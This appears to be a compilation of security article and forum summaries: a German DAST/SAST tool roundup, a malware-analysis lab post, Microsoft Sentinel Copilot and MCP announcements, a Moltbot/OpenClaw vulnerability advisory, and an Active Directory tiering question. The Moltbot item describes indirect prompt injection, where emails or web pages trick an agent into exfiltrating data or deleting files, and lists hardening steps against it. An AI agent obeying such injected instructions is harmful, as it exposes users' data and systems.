    "title": "Die besten DAST- & SAST-Tools",
    "summary": "Tools für Dynamic und Static Application Security Testing helfen Entwicklern, ihren Quellcode zu härten. Wir zeigen Ihnen die besten Tools zu diesem Zweck. Chim | shutterstock.com Die Softwarelieferkette – respektive ihre Schwachstellen – haben in den vergangenen Jahren für viel Wirbel gesorgt. Ein besonders schlagzeilenträchtiges Beispiel ist der Angriff auf den IT-Dienstleister SolarWinds , bei dem mehr als 18.000 Kundenunternehmen betroffen waren. Zwar war die Attacke beileibe nicht die einzige auf Softwarelieferketten – sie führte jedoch zu einer Neubewertung der Frage, wer dafür verantwortlich zeichnet. Eine Reaktion auf den SolarWinds-Angriff war beispielsweise Ex-US-Präsident Bidens “ Executive Order on Improving the Nation’s Cybersecurity “. Der Erlaß hob nicht nur hervor, wie bedeutsam die Absicherung der Lieferketten ist, sondern stellt auch ausdrücklich die Verantwortung der Entwickler heraus, wenn es darum geht, sichere Software zu liefern. Zwar gilt die Anordnung ausschließlich für US-Regierungsbehörden und deren Geschäftspartner. Sie steht jedoch stellvertretend dafür, dass alle beteiligten Organisationen ihre Softwareanbieter überprüfen müssen, um sicheren Code bereitzustellen – unabhängig davon, ob ein Unternehmen nur Programme und Anwendungen für sich selbst entwickelt oder Teil der Softwarelieferkette Dritter ist. Das größte Problem dabei: Softwareentwickler wurden viele Jahre lang nahezu ausschließlich danach beurteilt, wie schnell sie programmieren können. Security war dabei entweder ein nachgelagerter Gedanke oder der Verantwortungsbereich Anderer. Zwar bilden sich viele Entwickler inzwischen in Sachen Cybersecurity fort, sie brauchen jedoch Hilfe, um sicherzustellen, dass ihr Code frei von Sicherheitslücken ist. Dazu können Tools für Dynamic Application Security Testing (DAST) und Static Application Security Testing (SAST) einen wertvollen Beitrag leisten. DAST- & SAST-Tools – was ist das? Es ist nicht überraschend, dass sowohl SAST- als auch DAST-Tools in Zusammenhang mit der Absicherung von Softwarelieferketten wieder an Bedeutung gewinnen. Schließlich geben sie den Entwicklern die Werkzeuge an die Hand, um sicheren Code bereitzustellen – entweder als Teil eines offiziellen DevSecOps-Programms oder um die Verantwortung für die Security näher an den Ort der Anwendungsentwicklung zu verlagern. Sowohl SAST- als auch DAST-Tools haben das Ziel, den Code sicherer zu machen. Im Idealfall geschieht das lange bevor eine Anwendung in eine Produktionsumgebung gelangt und Teil der Softwarelieferkette wird. Dabei verfolgen die Tools dasselbe Ziel, gehen das Problem aber aus unterschiedlichen Blickwinkeln an: SAST-Tools analysieren den Quellcode von Programmen und Anwendungen, die sich noch in der Entwicklung befinden. Sie lassen sich in eine CI/CD-Pipeline integrieren oder so konfigurieren, dass sie automatisch aktiv werden, wenn ein Entwickler eine Pull-Anfrage stellt. So können Tools für Static Application Security Testing sicherstellen, dass mit neuen Änderungen an einer Anwendung nicht unbeabsichtigt Schwachstellen hinzugefügt werden oder anderweitige Fehler entstehen. Einige SAST-Tools können auch Teil integrierter Entwicklungsumgebungen (IDE) werden. In diesem Fall warnt die Plattform die Entwickler während der Programmierarbeit vor Fehlern – ähnlich wie eine moderne Textverarbeitung mit Rechtschreibprüfung. DAST-Tools werden im Gegensatz dazu eingesetzt, nachdem eine Applikation kompiliert ist. Ein Tool für Dynamic Application Security Testing ist weniger dazu gedacht, Schwachstellen im Code aufzudecken (die ein SAST Tool im Idealfall bereits beseitigt hat), sondern fungiert als externer Tester, der versucht, ein Programm beispielsweise über offene http- oder HTML-Schnittstellen zu hacken. Einige DAST-Tools können auch konfiguriert werden, um nach Schwachstellen für gängige Angriffe in bestimmten Branchen wie dem Finanzwesen oder dem Einzelhandel zu suchen. Wegen der genannten Unterschiede müssen SAST-Tools die von Ihnen gewählte Programmiersprache unterstützen. Das Gros der DAST-Tools erfordert das nicht, obwohl diese Tools unter Umständen auch mit Quellcode arbeiten können, um Probleme zu lokalisieren. Während einige Unternehmen entweder ausschließlich ein DAST- oder ein SAST-Tool verwenden, empfiehlt es sich, eine Kombination aus beiden einzusetzen oder mit einem Tool zu arbeiten, das beide Komponenten enthält. Unternehmen, die das tun, sind in der Lage, ihre Applikationen besser zu schützen, was der Sicherheit der Softwarelieferkette insgesamt zuträglich ist. Dynamic Application Security Testing Tools: Top 4 Im Folgenden finden Sie einige der wichtigsten DAST- und SAST-Tools, die heute zum Einsatz kommen. 1. Acunetix DAST Die Acunetix DAST-Plattform nutzt DAST und IAST (Interactive Application Security Testing), um nach über 7.000 Schwachstellen in fertigem Code, Website-Designs oder Anwendungen zu suchen. Bei IAST wird der Scan- und Testcode in ein kompiliertes Programm eingebettet, ähnlich wie bei Debug-Symbolen. Somit kann Acunetix seine Scans starten, während ein Programm aktiv ausgeführt wird. auf diese Weise werden potenziell mehr Schwachstellen aufgedeckt als bei der Untersuchung einer Anwendung im Ruhezustand. IAST sollte auch die Zahl der Fehlalarme (im Vergleich zu SAST) verringern. Der Code für die Plattform ist aus Speed-Gründen in C++ geschrieben. Dabei exportiert die Plattform bis zu 90 Prozent ihrer Ergebnisse bereits, während der Scan noch nicht einmal zur Hälfte abgeschlossen ist. Die Benutzer können die Acunetix-Plattform so konfigurieren, dass sie einmalig ausgeführt wird oder Zeitpläne für wiederholte Tests im Laufe der Zeit einrichten. Und weil die Plattform so schlank ist, kann sie sogar mehrere Umgebungen gleichzeitig scannen, ohne dabei an Geschwindigkeit einzubüßen. 2. Opentext Fortify WebInspect Die ehemalige Fortify-WebInspect-Plattform von Micro Focus firmiert nach der Übernahme des Unternehmens durch Opentext unter dem Namen Fortify WebInspect. Sie ist als On-Premises-Installation, als Service oder als Kombination aus beidem innerhalb einer hybriden Umgebung verfügbar. Obwohl es als isoliertes DAST-Tool arbeitet, lässt es sich in CI/CD-Pipelines integrieren und kann auch von Entwicklern genutzt werden, die normalerweise nur SAST-Tools verwenden. Das Tool kann auch nur nach besonders kritischen Schwachstellen suchen und die Entwickler so vor schwerwiegenden Fehlern warnen, damit diese schon lange vor Bereitstellung behoben werden. Darüber hinaus ist dieses DAST-Tool auch in der Lage zu prüfen, ob der Code im Einklang mit staatlichen Regularien steht (NIST 800-53, PCI DSS, OWASP, HIPAA, etc.). Wird eine Schwachstelle entdeckt, visualisiert die Plattform das Problem mit einer grafischen Oberfläche und unterbreitet iterative Lösungsvorschläge. 3. Black Duck (ehemals Synopsis) Die DAST-Plattform von Black Duck ist auch als Managed Service verfügbar. Dadurch entfällt nicht nur interne Wartung und Management – das Unternehmen steht bei Bedarf auch mit Rat und Tat zur Seite, beispielsweise wenn Scan ein Problem aufwirft, mit dem das Entwicklungsteam überfordert ist. Das Tool deckt nicht nur alle gängigen Schwachstellen auf, die viele Programme plagen (etwa SQL-Injection oder Cross-Site-Scripting), sondern verfügt auch über einen manuellen Scan-Modus, mit dem Sie auch komplexeren Problemen gezielt auf dioe Spur kommen. Auch Sicherheitslücken in Zusammenhang mit Authentifizierungs-, Zugriffskontroll- und Session-Management-Fehlern, die bei herkömmlichen Scans nicht auftauchen, findet das Tool. 4. Tenable.io Web App Scanning Tenable ist unter den Sicherheitsanbietern eine Art Urgestein und ist in erster Linie für seine robuste, Cloud-basierte Vulnerability-Management-Plattform bekannt. Web App Scanning ist ein Teil dieser Plattform und fungiert als leistungsfähiges DAST-Tool. Die Tenable-App arbeitet nur mit Webanwendungen, führt aber einen tiefgehenden Scan durch, der sowohl HTML5 als auch Standard-HTML und AJAX abdeckt. Die App verfügt über eine simple Benutzeroberfläche, die auch für Teams zugänglich ist, die ohne Application-Security-Spezialisten auskommen müssen. Automatisierungen sind einfach einzurichten und die Benutzer können genau konfigurieren, welche Abschnitte des Programmcodes gescannt werden sollen. Davon abgesehen lässt sich der Web App Scanner auch als Standalone-Lösung verwenden – oder in eine andere Cybersecurity-Lösung von Tenable integrieren. Static Application Security Testing Tools: Top 5 1. Checkmarx SAST Das SAST-Programm von Checkmarx kombiniert fortschrittliche Funktionen mit einer der besten webbasierten Benutzeroberflächen für SAST-Tools. Die Benutzeroberfläche ermöglicht es auch Security-Unkundigen, sich zurechtzufinden. Checkmarx identifiziert nicht nur Schwachstellen, sondern erklärt auch, warum eine entdeckte Schwachstelle besonders riskant ist. Zudem erhalten Entwickler Tipps, wie die gefundenen Probleme am einfachsten und effektivsten beseitigt werden können. Standardmäßig unterstützt das Checkmarx-Tool über 25 Programmiersprachen. Zudem lässt sich die Anwendung so konfigurieren, dass sie automatisch als Teil einer CI/CD-Pipeline ausgeführt wird. Natürlich dürfen Sie auch benutzerdefinierte Abfragen einrichten und nach Bedarf ausführen und das Tool in alle gängigen IDE- oder Quellcode-Management-Plattformen integrieren. 2. Opentext Fortify Static Code Analyzer Sowohl SAST- als auch DAST-Elemente kombiniert Fortify Static Code Analyzer von Opentext. Als SAST-Plattform verwendet die Lösung eine übersichtliche, visuelle Schnittstelle, um Entwicklern die spezifischen Schwachstellen im Code (und Statistiken über die Art der regelmäßig aufgedeckten Schwachstellen) aufzuzeigen, die in 810 verschiedene Schwachstellenkategorien unterteilt sind. Anschließend werden die Entwickler zu einer Schulungsoberfläche weitergeleitet, die laut Anbieter interessante und unterhaltsame Lektionen über Security und sicheren Code bereithalten soll. Die Plattform unterstützt 27 Programmiersprachen und Frameworks und kann On-Premises oder als Service eingesetzt werden. Zudem lässt sie sich in die meisten gängigen IDEs wie Eclipse und Visual Studio integrieren. 3. Perforce Klocwork SAST Das SAST-Tool Klocwork setzt den Fokus auf Geschwindigkeit – selbst in den größten Umgebungen. Es funktioniert mit Anwendungen, die in C, C++, Java, JavaScript und Python kodiert sind – sogar innerhalb von Docker-Containern – und kann in jede größere IDE wie Visual Studio Code, IntelliJ und viele andere integriert werden. Laut Anbieter wurde Klocwork entwickelt, um ein SAST-Tool für komplexe Umgebungen zu realisieren. Mit Klocwork können Anwender riesige Codebasen scannen, die Millionen von Zeilen beinhalten. Um die Scan-Dauer zu verkürzen, werden beispielsweise nur die geänderten Codebereiche gescannt und nicht jedes Mal das gesamte Programm. Darüber hinaus hilft das SAST-Tool dabei, Entwickler in Sachen Security zu schulen: Es ist vollständig in die Schulungsplattform Secure Code Warrior integriert, die sich auf Sicherheits- und Awareness-Schulungen konzentriert. 4. Spectral SpectralOps-Plattform Check Point hat vor kurzem Spectral übernommen, aber das neue Unternehmen unterstützt weiterhin aktiv die SpectralOps-Plattform, wahrscheinlich auch wegen ihrer einzigartigen SAST-Funktionen. SpectralOps findet sensible Informationen wie API-Schlüssel, Anmeldeinformationen und Token, die Entwickler bei der Entwicklung von Programmen oft fest einkodieren. Die Idee dahinter: Fehlkonfigurationen aufzudecken, die den Zugriff auf geheime Informationen ermöglichen könnten, während sich ein Programm noch in der Entwicklung befindet. SpectralOps scannt kontinuierlich jeden Schritt im Lebenszyklus der Softwareentwicklung und nutzt Künstliche Intelligenz, um über 2.000 Erkennungs-Engines im Auge zu behalten. Um Fehlalarme in Zaum zu halten, finden auch nachgelagerte Tests statt. Im Anschluss kann das Tool seine Ergebnisse an Slack melden, ein Jira-Ticket ausstellen oder Entwickler über fast jede beliebige Kommunikationsplattform alarmieren. 5. Veracode Static Analysis SAST Die SAST-Plattform von Veracode ist ein Cloud Service – die komplexe Wartung einer SAST-Anwendung in Ihrer Umgebung entfällt damit. Sicherheitsanbieter Veracode arbeitet nach dem Prinzip des Just-in-Time-Learnings. Das bedeutet, anfälliger Code kann bereits bei der Programmierarbeit erkannt werden. Ist der Code korrigiert, erstellt die Veracode-Plattform ein Reporting, so dass Unternehmen sicherheitsbewusste Entwickler fördern und ermutigen können. Neben der Integration in eine IDE liegt der Schwerpunkt von Veracode auf Geschwindigkeit: Jeder Build eines Programms oder einer Anwendung kann automatisch gescannt werden, wobei die durchschnittliche Scan-Zeit bei lediglich 90 Sekunden liegt. Dabei wird durchgängig jede Aktion erfasst, was wiederum Audits erleichtert. Sie wollen weitere interessante Beiträge rund um das Thema IT-Sicherheit lesen?

    "title": "Lab Showcase] Ideas for building a Threat Intel & Malware Analysis Lab on Proxmox (Whonix + FlareVM)",
    "summary": "Hi community, I’m currently at a MSSP/integration firm handling SIEM/SOAR for various clients. We recently had a client get hit by a threat actor (likely targeting Mexican institutional infrastructure), and the pressure was on. I managed to track down the exfiltrated data on a darknet forum using a \"shitty-quick\" Tor lab I threw together overnight. That experience was a wake-up call on how much a streamlined, secure TI lab actually matters when you're racing against an adversary. So, I’ve spent the weekend rebuildng my lab on Proxmox . I decided to swap Tails for Whonix for the first time. I get the \"less secure\" feeling—Whonix keeps the workstation persistent unlike Tails' amnesic nature—but the isolation between the Gateway and Workstation is a game-changer for preventing IP leaks. The Current Stack: Hypervisor: Proxmox VE (Segmented via Linux Bridges). Anonymity: Whonix-Gateway + Whonix-Workstation. Windows Analysis: FlareVM (Isolated on a non-physical bridge). Linux Analysis: REMnux (The GOAT for static/dynamic Linux analysis). Connectivity: Cloudflared tunnel (getting me close, but not quite there yet). Current Setup Diagram https://imgur.com/a/pGJHWUt Right now, my Cloudflare setup won't let me hit the workstation directly, so I’m stuck with the laggy Proxmox VNC console. It’s \"fine\" for browsing, but a nightmare for actual analysis. Here is the goal I have in mind : https://imgur.com/a/H6zzL9J I’m looking to optimize the remote access without punching holes in my firewall. I’m also trying to find the best balance for \"secure enough\" file transfers between the Whonix \"Discovery\" zone and the FlareVM \"Detonation\" zone. If you’ve got best practices for air-gapping Proxmox nodes or managing ISO-based one-way transfers for malware samples, I’m all ears.

    "title": "The Microsoft Copilot Data Connector for Microsoft Sentinel is Now in Public Preview",
    "summary": "We are happy to announce a new data connector that is available to the public: the Microsoft Copilot data connector for Microsoft Sentinel. The new Microsoft Copilot data connector will allow for audit logs and activities generated by different offerings of Copilot to be ingested into Microsoft Sentinel and Microsoft Sentinel data lake. This allows for Copilot activities to be leveraged within Microsoft Sentinel features such as analytic rules/custom detections, Workbooks, automation, and more. This also allows for Copilot data to be sent to Sentinel data lake, which opens the possibilities for integrations with custom graphs , MCP server , and more while offering lower cost ingestion and longer retention as needed. Eligibility for the Connector The connector is available for all customers within Microsoft Sentinel, but will only ingest data for environments that have access to Copilot licenses and SCUs as the activities rely on Copilot being used. These logs are available via the Purview Unified Audit Log (UAL) feed, which is available and enabled for all users by default. A big value of this new connector is that it eliminates the need for users to go to the Purview Portal in order to see these activities, as they are proactively brought into the workspace, enabling SOCs to generate detections and proactively threat hunt on this information. Note: This data connector is a single-tenant connector, meaning that it will ingest the data for the entire tenant that it resides in. This connector is not designed to handle multi-tenant configurations. What’s Included in the Connector The following are record types from Office 365 Management API that will be supported as part of this connector: 261 CopilotInteraction 310 CreateCopilotPlugin 311 UpdateCopilotPlugin 312 DeleteCopilotPlugin 313 EnableCopilotPlugin 314 DisableCopilotPlugin 315 CreateCopilotWorkspace 316 UpdateCopilotWorkspace 317 DeleteCopilotWorkspace 318 EnableCopilotWorkspace 319 DisableCopilotWorkspace 320 CreateCopilotPromptBook 321 UpdateCopilotPromptBook 322 DeleteCopilotPromptBook 323 EnableCopilotPromptBook 324 DisableCopilotPromptBook 325 UpdateCopilotSettings 334 TeamCopilotInteraction 363 Microsoft365CopilotScheduledPrompt 371 OutlookCopilotAutomation 389 CopilotForSecurityTrigger 390 CopilotAgentManagement These are great options for monitoring users who have permission to make changes to Copilot across the environment. This data can assist with identifying if there are anomalous interactions taking place between users and Copilot, unauthorized attempts of access, or malicious prompt usage. How to Deploy the Connector The connector is available via the Microsoft Sentinel Content Hub and can be installed today. To find the connector: Within the Defender Portal, expand the Microsoft Sentinel navigation in the left menu. Expand Configuration and select Content Hub . Within the search bar, search for “Copilot”. Click on the solution that appears and click Install . Once the solution is installed, the connector can be configured by clicking on the connector within the solution and selecting Open Connector Page . To enable the connector, the user will need either Global Administrator or Security Administrator on the tenant. Once the connector is enabled, the data will be sent to the table named CopilotActivity . Note: Data ingestion costs apply when using this data connector. Pricing will be based on the settings for the Microsoft Sentinel workspace or at the Microsoft Sentinel data lake tier pricing. As this data connector is in Public Preview, users can start deploying this connector right now! As always, let us know what you think in the comments so that we may continue to build what is most valuable to you. We hope that this new data connector continues to assist your SOC with high valuable insights that best empowers your security.

    "title": "The Agentic SOC Era: How Sentinel MCP Enables Autonomous Security Reasoning",
    "summary": "Security teams already have access to enormous volumes of telemetry across identity, endpoint, network, and cloud. The real challenge isn’t collecting more data. It’s turning that data into faster decisions and better protection. This is where AI changes the game. Microsoft Sentinel MCP Server , now generally available, augments analysts with intelligence that can reason across signals, automate investigations, and surface what truly matters . AI helps Security Opera tions Center ( SOC s ) move faster, reduce fatigue, and measurably improve the security posture of the organization. The Problem: Data is Growing Faster Than Analysts Can Keep Up While modern SOCs are rich in telemetry, the day-to-day reality for analysts is far less empowering. Security analysts and detection engineers spend countless hours trying to: Remember schema names and values across a growing number of tables. Translate natural investigative questions into exact column names and joins. Write complex queries to answer what should be simple questions. Interpret fragmented results and relate them back to the security problem at hand. The outcome is predictable: critical insights remain buried, not because the data isn’t there, but because accessing it requires deep technical context and manual effort. When Context Comes from Time, Not Volume Given the dynamic nature of attackers, determining whether an activity is truly malicious often requires looking far beyond a short time window. Many threats deliberately blend into normal day to day operations by moving slowly, exploiting business seasonality, and making subtle incremental changes that only become obvious when viewed over time. Without access to long-term security data, SOC teams are forced to make decisions based on limited context window. Having extended visibility into the environment allows analysts to understand what “normal” really looks like across business cycles, seasonal usage patterns, and organizational changes. This long-term perspective unlocks: More confident anomaly detection by separating genuine threats from expected variation. Richer behavioral baselines for users, service principals, applications and devices. Lifecycle tracking of identities, permissions and workloads as they evolve. Detection of slow-moving attacks that unfold gradually over weeks or months. Long-term data turns isolated events into meaningful behavior and enables investigations that are grounded in context rather than guesswork. Introducing Sentinel MCP D ata Exploration Tools KQL and Spark notebooks continue to serve as essential tools for security analysts and detections engineers who need precise control, repeatable analytics, and performance-tuned queries over the Sentinel data lake. Microsoft Sentinel MCP Server enables analysts to now have a fast, conversational way to explore the data and instantly uncover security insights without hunting for schemas or crafting complex queries. This new interaction layer democratizes access to big security data, while still allowing teams to convert those natural-language explorations into full KQL queries or Jupyter Notebook cells when they’re ready to operationalize the insight. The MCP Server for Sentinel enables AI-driven agents such as Security Copilot , GitHub Copilot , Azure Foundry, and ChatGPT Enterprise to perform advanced reasoning over large-scale security telemetry. Under the hood: Queries expressed in natural language and parsed into actionable intents. The underlying model applies semantic interpretation to map intent to relevant security artefacts. It orchestrates retrieval by combining enterprise security datasets with embedded domain knowledge for evidence correlation. Outputs are delivered as structured, explainable artefacts optimized for analyst workflows and downstream automation. Let's look at some examples. Example 1: Find dormant Service Principals recently reactivated To see this in practice, consider a security analyst using VS Code not as a development tool, but as a lightweight, guided workspace powered by GitHub Copilot and Sentinel MCP where questions are asked in plain language and insights are returned without requiring query or coding expertise. If you’d like to follow along, first connect GitHub Copilot Agent in VS Code to the Sentinel MCP server using the setup instructions. ( Instructions here ) For these examples, I am using Claude Opus 4.5 as the model in Prompt: \"Find service principals dormant for 60+ days that generated sign-ins in the last 7 days. Summarize by app name and sign-in volume. Render a ranked ASCII table and Pareto chart, include 80/20 analysis and a security assessment. State explicitly if no dormant principals reactivated.\" The analyst doesn’t specify tables, joins or time filters. They just describe the outcome they want. Behind the scenes, the MCP server: Uses its tools to query service principal sign-in activity from the Sentinel data lake. Identifies principals with zero activity for >60 days and checks whether they generated sign-ins in the current week. Builds an ASCII Pareto chart of service principal activity for the week, then layers analytic commentary on top. Example 2: Hunting Rare Parent–Child Process Chains With MCP. Some threats only reveal themselves in the long tail of process behavior, the rare, unusual parent–child combinations that almost never occur in normal operations. To explore this, the analyst can now simply ask the MCP tools: Prompt: \"Find parent–child process combinations in DeviceProcessEvents seen fewer than 5 times in the last 90 days. Return a ranked table and an ASCII process tree for each rare chain, including device, user, integrity level, and command line. Assess risk and state explicitly if no rare combinations are found.\" No joins, no windowing functions, no manual group-bys across billions of events. Just plane simple intent. The MCP tools then: Queries DeviceProcessEvents in the Sentinel data lake for the last 90 days. Aggregates process pairs and filters to combinations seen fewer than 5 times . Enriches results with device, user, command line, integrity level and timestamp. Applies its own reasoning layer to categorize each pair by risk level and produce an analyst-ready report. The answer comes back as a structured investigation summary. The MCP server performs extensive work by scanning DeviceProcessEvents from 90 days to detect unusual chains which it then ranks by risk level before converting them into actionable results. Example 3 - Detecting Scope Drift Across Service Principals Using Multi-Source Correlation Now let’s tie it back with the example we discussed earlier about dealing with long range data and how to analyze to surface scope drift etc. Let’s see how analysts use MCP tools uncover this. Prompt: “Detect scope drift in service principals or automation accounts that gradually expand access or behavior beyond their established baseline. Correlate across AADServicePrincipalSignInLogs, AuditLogs, DeviceNetworkEvents and SecurityAlert. Build a 90-day behavioral baseline per principal and compare with the last 7 days. Compute a Drift Score and flag any entity exceeding 150% of baseline deviation.” The MCP server automatically: Pulls sign-in logs, permission change logs, network events and alert metadata from the Sentinel data lake Builds 90-day baselines for: average daily sign-ins distinct IP ranges resource scopes Compares the last 7 days against those baselines. Computes a weighted Drift Score. Generates an ASCII summary table, heat indicators and a full risk report. The result is a fully correlated identity-centric investigation. Traditionally analysts need to query data sets manually put timelines together and build a baseline by hand to find the scope drift pattern. This is where the MCP server becomes especially powerful. It pulls these signals together, builds the behavioral baseline automatically and surfaces drift in a single, coherent investigation. Example 4 – From External Intelligence to Cross-Environment Validation One of the most powerful shifts enabled by LLMs in a modern SOC is their ability to reason over external knowledge and immediately operationalize it against internal telemetry. Instead of treating threat research as something analysts read and manually translate into hunts, the model can ingest a public report, extract attacker behavior, and turn it into a structured investigation plan. In this scenario, the LLM starts by reading an external blog post describing an AiTM phishing campaign. From that narrative, it identifies concrete tactics and signals proxy-based sign-in flows, MFA bypass via session cookies, anomalous sign-ins, mailbox rule creation, and BEC-style outbound activity. It then converts those descriptions into explicit hypotheses that can be tested against security data. Prompt: \"Review the AiTM phishing campaign details from this article: https://www.microsoft.com/en-us/security/blog/2022/07/12/from-cookie-theft-to-bec-attackers-use-aitm-phishing-sites-as-entry-point-to-further-financial-fraud/ Based on the tactics described (proxy sign-in pages, MFA bypass via session cookies, unusual sign-ins, mailbox rule creation, BEC-style outbound emails), check all my environments for any similar activities in the last 90 days. Look for: unusual sign-in locations or devices token/session-reuse patterns new inbox rules suspicious mailbox access unusual outbound replies on financial threads Give me: Any matching suspicious events per environment. A short explanation of why they might relate to AiTM behavior. A simple risk summary (high, medium, low) for each environment. Only use telemetry available in each MCP environment and clearly state if something isn’t present” What makes this especially valuable for multi-tenant organizations is that the same reasoning is applied independently within each environment , using only the telemetry that exists in that tenant. The model doesn’t assume uniform visibility. If a signal such as mailbox rules or session reuse isn’t available in a given environment, it explicitly calls that out rather than inferring results. The outcome is not just detection, but comparability. Each tenant receives: a list of suspicious events, if any. a short explanation mapping those events back to AiTM tactics. and a clear risk rating based on observed evidence. This is where ability of AI tools with Sentinel MCP tools fundamentally change security operations. They bridge the gap between human-readable threat intelligence and machine-scale validation , allowing organizations to consistently test real-world attack techniques across many environments faster, more accurately, and with far less manual effort. In an agentic SOC, this pattern becomes repeatable: new threat research comes in, the model reasons over it, and every environment is checked for exposure turning external knowledge into immediate defensive insight. Tips for success: Writing effective prompts for the MCP tools are all about being explicit, grounded and structured. You get the most accurate, non-hallucinated results. Think of your prompt as a task description for an analyst, precise, scoped and strictly evidence driven. Here are few best practices. Specify the exact tables and time ranges. Example: “Query DeviceProcessEvents for the last 90 days and compare the last 7 days against baseline.” Define thresholds and what “rare,” “baseline,” or “anomalous” means. Example: “Flag parent–child processes seen fewer than 5 times in the 90-day window.” Request clear output formats. Example: “Return results in a table with columns for parent, child, count, device, and timestamp.” Example: “Generate an ASCII tree showing the rare process chains.” Tell MCP to rely strictly on tool output and avoid assumptions. Example: “Base all findings only on retrieved logs; do not create fields or values not present in data.” Use iterative prompts to refine results. Example: “Now focus only on SYSTEM-level processes,” or “Filter to only high-severity deviations.” The SOC is evolving from a reactive, alert-driven function into an agentic system. one where autonomous workflows, intelligent reasoning and continuous context-awareness work alongside analysts to defend the enterprise at scale. Microsoft Sentinel MCP Server sits at the heart of this shift. By layering natural-language reasoning on top of the Sentinel, it gives defenders a way to interact with their entire security estate conversationally, while enabling agents and copilots to operate on the same rich foundation.

    "title": "From Clawdbot to Moltbot to OpenClaw: Security Experts Detail Critical Vulnerabilities and 6 Immediate Hardening Steps for the Viral AI Agent",
    "summary": "Moltbot, the viral AI agent, offers immense power but is riddled with critical vulnerabilities, including remote code execution (RCE), exposed control interfaces, and malicious extensions. Read on to understand the vulnerabilities associated with Moltbot and the immediate security practices users must prioritize to mitigate this enormous agentic AI security risk. Key takeaways Moltbot takes an AI agent, gives it access to your computer, your communication streams, your accounts, and much, much more. Given the severe and active threats, including exposed control interfaces, authentication bypasses, and malicious extensions, users must prioritize the security practices outlined below. The convenience of incredible power cannot outweigh the risk that Moltbot’s vulnerabilities create. What is Clawdbot? Clawdbot (recently rebranded as Moltbot and subsequently to OpenClaw due to a trademark dispute with Anthropic) is a viral open-source AI assistant. It has been praised for its ability to autonomously execute tasks on local hardware, exemplifying what modern AI can do to truly help end users. As of January 2026, and coinciding with the application's widespread viral adoption, security researchers have identified multiple significant vulnerabilities that place Moltbot users at risk. What is Moltbot used for? Moltbot is a multi-function AI agent designed to perform many tasks. Indeed, the website claims it “Works With Everything.” Some features include: Setup: Runs on any machine with a choice of models. Integrations: Works with any chat app Browse the Web: Submit forms on your behalf, find information. Memory: Remembers context about you and your preferences Extensible: Use or write plugins and skills Access: Ability to read and write to disk, execute commands, and more. Sandbox: Tools and agents can run inside Docker containers and require approval. The agent already has an enormous list of official and custom integrations. Given the large feature set, Moltbot must also have a large attack surface. Let’s take a look at Moltbot from an agentic AI security perspective. Is Moltbot safe? Critical agentic AI security vulnerabilities Remote code execution (RCE): Coding issues in the gateway could allow attackers to run commands on the host system with the same permissions as the user, potentially leading to full system compromise. A researcher from depthfirst identified CVE-2026-25253 , chaining two findings to execute code on the bot. Two more command injection CVEs have been identified ( CVE-2026-24763 and CVE-2026-25157 ). Malicious skills: An OpenClaw bot at Koi identified a few hundred malicious skills in the ClawHub skills repo. Exposed control interfaces: Researchers from SlowMist and other firms found that many users misconfigure their setups, leaving the Clawdbot Control web interface publicly accessible on the internet without password protection. Authentication bypass: A flaw in how the gateway handles localhost connections allows external attackers to bypass login protections when the software is deployed behind a common reverse proxy (like Nginx). Sensitive data leaks: Moltbot stores authentication tokens (API keys), user profiles, and memories in plaintext Markdown and JSON files. Attackers who gain access can steal these keys to take over accounts or conduct Cognitive Context Theft using private conversation histories. Indirect prompt injection: Because the tool can read emails, chat messages, and web pages, malicious actors can send messages that trick the AI into executing unauthorized commands, such as exfiltrating data or deleting files. Recent risks and rebranding Trademark rebrand: On January 27, 2026, the project was renamed Moltbot following a legal request from Anthropic. Account hijacking: During the name change, the original @clawdbot handles on X and GitHub were immediately snatched by crypto scammers who are now using them to promote fake tokens ($CLAWD) to the project's more than 60,000 followers. Second trademark rebrand : On January 29, the project was renamed OpenClaw . Malicious extensions: Fake \"Clawdbot Agent\" extensions for VS Code have been discovered. These fake extensions install trojans and remote access malware on users’ machines. Recommended security practices for Moltbot users If you choose to run this software, security experts recommend several immediate hardening steps: Strict whitelisting: Use the OpenClaw Security Guide to explicitly whitelist only necessary tools and block dangerous shell execution capabilities. Verify gateway settings: Ensure gateway.auth.password is set and verify that your reverse proxy correctly passes headers so authentication is not bypassed. Use sandboxing: Enable sandbox mode for the AI agent to restrict its access to your filesystem and browser. Run security audits: Use the built-in security audit tool periodically to check for exposed ports or misconfigurations. Restrict token access: Moltbot uses API keys and other tokens to access services. These should all be scoped appropriately to allow just enough access and disallow dangerous actions. Privacy: Moltbot can be added to group channels where it can read and parse untrusted messages. To help mitigate the risk of prompt injection, grant access only to trusted people and channels.

    "summary": "I'm in a small IT staff that consists of 5 people. I'm the security guy, there's a network guy, a server guy and 2 support guys. Although we have our primary responsibilities that go with the titles, we all wear multiple hats in the environment. We also have several application devs/support people, but I consider them outside of IT, at least for these purposes. For decades (long before I got here), we've done things wrong and now as the security guy, I need to fix it. It's one of the classic cases of, \"oh, you need to administer users and computers? OK, we'll put you in the Domain Admins group.\" (Not quite that bad, but not far off.) I started down the path of a full tiered access model, but I think I'm making it a bit too complicated for my small team. So, I'm rethinking it to something like this: Security/Network/Server guys: Username - normal account to sign on to PC, get email, etc. Username.admin Workstation admin Server admin AD server OU administration AD user and workstation OU administration Username.domainadmin Domain Controller admin PKI infrastructure Identity servers/services Support guys: Username - normal account to sign on to PC, get email, etc. Username.admin Workstation admin Server admin (only approved servers - file/print/etc.) AD user and workstation OU administration Application Devs: Username - normal account to sign on to PC, get email, etc. Username.admin Server admin (only approved servers for their applications) I'd still follow other best practices/recommendations, such as locking down RDP & local logon privileges, denying domain admin acccess to lower tiers, utilizing PAWs, etc. Questions: Should I use the Domain Admins group for my \"username.domainadmin\" accounts? Or set up a different group and delegate rights? Where do my \"break glass\" accounts fit in? Domain Admins? Should those have access to lower tiers? Which level has Azure admin rights? (We're hybrid.) \"Domainadmin\" for synching and \"admin\" for other administration? What else am I not thinking about here? submitted by /u/KingKongsNipple [link] [comments]",

